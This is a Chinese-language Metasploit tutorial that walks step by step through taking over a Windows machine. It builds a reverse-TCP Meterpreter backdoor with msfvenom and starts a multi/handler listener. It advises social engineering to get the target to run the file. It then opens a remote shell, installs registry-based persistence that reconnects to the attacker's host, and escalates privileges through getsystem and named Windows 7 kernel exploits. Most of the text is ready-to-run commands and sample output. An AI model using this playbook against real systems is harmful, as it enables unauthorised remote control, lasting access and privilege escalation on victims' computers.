# msf

生成后门并获取 Meterpreter 会话，直到最终进入 Shell 的完整过程通常分为以下几个步骤：

### **第 1 步：生成恶意 Payload (后门)**

这一步使用 `msfvenom` 工具来创建一个可执行文件，它包含了后门代码和连接信息。

**命令格式：**

```plain
msfvenom -p <payload> LHOST=<攻击者IP> LPORT=<监听端口> -f <文件格式> -o <输出文件名>
```

**示例 (Windows 环境)：**

假设你的攻击机 IP 是 `192.168.1.100`，想使用 `3333` 端口进行监听，生成一个 Windows 可执行文件：

```plain
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=3333 -f exe -o backdoor.exe
```

* `-p windows/meterpreter/reverse_tcp`：指定 payload 类型为 Windows 反向 TCP 连接的 Meterpreter。
* `LHOST=192.168.1.100`：指定攻击者的 IP 地址。
* `LPORT=3333`：指定攻击者用于监听的端口。
* `-f exe`：指定输出文件格式为 Windows 可执行文件。
* `-o backdoor.exe`：指定输出文件名。

### **第 2 步：在攻击机上设置监听**

生成后门后，你需要启动一个监听器来等待目标机器执行后门并连接回来。

1. \*\*启动 \*\*`**msfconsole**`：

```plain
msfconsole
```

2. **使用 **`**multi/handler**`** 模块**：

这是一个通用的监听模块，可以处理各种 payload 的反向连接。

```plain
msf6 > use exploit/multi/handler
```

3. **设置 Payload**：

选择与生成后门时相同的 payload。

```plain
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
```

4. **设置监听参数**：

设置与后门文件中相同的 `LHOST` 和 `LPORT`。

```plain
msf6 exploit(multi/handler) > set LHOST 192.168.1.100
msf6 exploit(multi/handler) > set LPORT 3333
```

5. **开始监听**：

执行 `run` 或 `exploit` 命令。

```plain
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.1.100:3333
```

```
- `-j` 参数表示将监听任务放入后台，这样你仍然可以在控制台执行其他命令。
```

### **第 3 步：将后门文件发送给目标并使其执行**

**这一步通常需要社会工程学或利用其他漏洞。你需要想办法让目标机器下载并运行你生成的 **`backdoor.exe`** 文件。**

### **第 4 步：获取 Meterpreter 会话**

一旦目标机器执行了 `backdoor.exe`，它就会尝试连接到你的监听器。如果连接成功，你会在 `msfconsole` 中看到以下信息，表示你成功获取了 Meterpreter 会话：

```plain
[*] Sending stage (175686 bytes) to 192.168.1.135
[*] Meterpreter session 1 opened (192.168.1.100:3333 -> 192.168.1.135:52206) at 2025-08-23 21:17:00 +0900
```

### **第 5 步：进入 Shell**

1. **查看会话**：

使用 `sessions` 命令可以列出所有活动的会话。

```plain
msf6 exploit(multi/handler) > sessions -l
```

2. **进入会话**：

使用 `sessions -i ` 命令与特定的会话进行交互。

```plain
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...
```

3. **获取 Shell**：

在 Meterpreter 提示符 `meterpreter >` 下，输入 `shell` 命令即可进入被控端的命令行界面。

```plain
meterpreter > shell
Process 1234 created.
Channel 1 opened.
Microsoft Windows [Version 10.0.19045.3086]
(c) Microsoft Corporation. All rights reserved.

C:\Users\target\>
```

现在，你可以在 `C:\Users\target\>` 提示符下执行任何系统命令。如果想返回 Meterpreter，只需输入 `exit` 或 `Ctrl+C`。

> \*\* 编码问题\*\*：在某些情况下，Windows Shell 可能会出现乱码。这可以通过在 `shell` 之后输入 `chcp 65001` 来尝试解决

### 第 6 步：权限持久化

1. **将会话切换到后台**

不能在 `meterpreter >` 提示符下直接使用 `exploit` 模块。需要先用 `background` 命令将其退回到主控制台。

Shell

```plain
meterpreter > background
[*] Backgrounding session 1...
```

2. **加载新的持久化模块**

现在，你回到了 `msf6 >` 的主提示符下。在这里加载正确的模块。

Shell

```plain
msf6 > use exploit/windows/local/persistence
```

3. **设置模块选项**

新模块的选项设置方式与旧脚本的参数有所不同，但功能是一一对应的。

Shell

```plain
# 指定要作用于哪个会话（比如，你刚才退到后台的 session 1）
msf6 exploit(windows/local/persistence) > set SESSION 1

# 设置反向连接的 IP 地址（你的攻击机IP）
msf6 exploit(windows/local/persistence) > set LHOST 192.168.145.128

# 设置反向连接的端口
msf6 exploit(windows/local/persistence) > set LPORT 3333

# 设置自启动方式为“用户登录时启动”（等同于旧命令的 -U 参数）
msf6 exploit(windows/local/persistence) > set STARTUP USER

# 设置每次重连的等待间隔为20秒（等同于旧命令的 -i 20 参数）
msf6 exploit(windows/local/persistence) > set RETRY_WAIT 20
```

4. **执行模块**

设置完所有选项后，执行 `run` 命令。

Shell

```plain
msf6 exploit(windows/local/persistence) > run
```

这样操作之后，Metasploit 就会在目标机上执行和旧脚本完全相同的操作——上传后门程序，并创建注册表启动项，以达到持久化控制的目的。

**最后请记住**：在执行完之后，一定要在 Metasploit 中设置一个对应的 `exploit/multi/handler` 监听器，用来接收将来从目标机反弹回来的新连接。👍

### 第 7 步：权限收集和提权

首先，你需要了解你当前的权限等级，然后尝试提升权限到 **System** 或 **Administrator**。

1. **收集系统信息**
 * 使用 `whoami /priv` 命令查看你当前拥有的特权。
 * 使用 `systeminfo` 命令收集操作系统版本、补丁情况等信息，寻找可以利用的已知漏洞。
 * 使用 `net user` 和 `net localgroup administrators` 命令查看当前用户和管理员组信息，判断当前用户是否在管理员组。
 * 查看是否有未打补丁的漏洞，例如著名的 **MS10-059** 或 **MS11-080** 提权漏洞，这些在 Windows 7 上很常见。
2. **提权方法**
 * **Metasploit 自动提权**：如果你的 Shell 是一个 Meterpreter 会话，可以使用 `getsystem` 命令，这是最简单、最快捷的方式。如果该命令失败，可以尝试使用 `post/multi/manage/shell_to_meterpreter` 将 Shell 升级为 Meterpreter。
 * **已知漏洞利用**：基于你收集到的 `systeminfo` 信息，可以去 Exploit-DB 或 Metasploit 的本地数据库中搜索针对该系统版本的提权漏洞，然后利用对应的 `exploit` 模块进行攻击。
 * **内核漏洞**：Windows 7 存在许多可利用的内核漏洞，例如 `ms10_059_chimichanga_priv_esc` 或 `ms11_080_afd_afd_priv_esc`。
 * **配置错误**：检查服务配置、可写服务路径、不安全的服务权限等。如果发现某个服务可以被非管理员用户修改或重启，你可能可以通过劫持服务来执行恶意代码。
